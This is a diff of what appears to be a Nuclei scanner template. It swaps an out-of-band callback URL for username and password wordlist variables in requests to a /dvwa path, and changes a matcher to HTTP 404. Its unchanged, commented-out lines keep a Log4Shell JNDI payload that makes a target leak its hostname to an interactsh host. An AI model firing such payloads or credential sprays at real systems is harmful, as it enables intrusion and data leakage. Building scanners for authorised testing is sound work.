@@ -21,9 +21,9 @@ info:
 requests:
   - request:
       - |
-        GET /dvwa?user={{users}}&pass={{interactsh-url}} HTTP/1.1
+        GET /dvwa?user={{users}}&pass={{passwords}} HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: abcxyz
+        User-Agent: {{users}}{{passwords}}
 #      - |
 #        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
 #        Host: {{Hostname}}
@@ -98,12 +98,11 @@ requests:
 #        regex:
 #          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
 #          -
-#      - type: word
-#        word:
-#          - "status: NOERRORR"
-#        condition: and
-#        negative: false
-#        part: interactsh_response
+      - type: status
+        status:
+          - 404
+        condition: or
+        negative: false
 
       - type: word
         word:
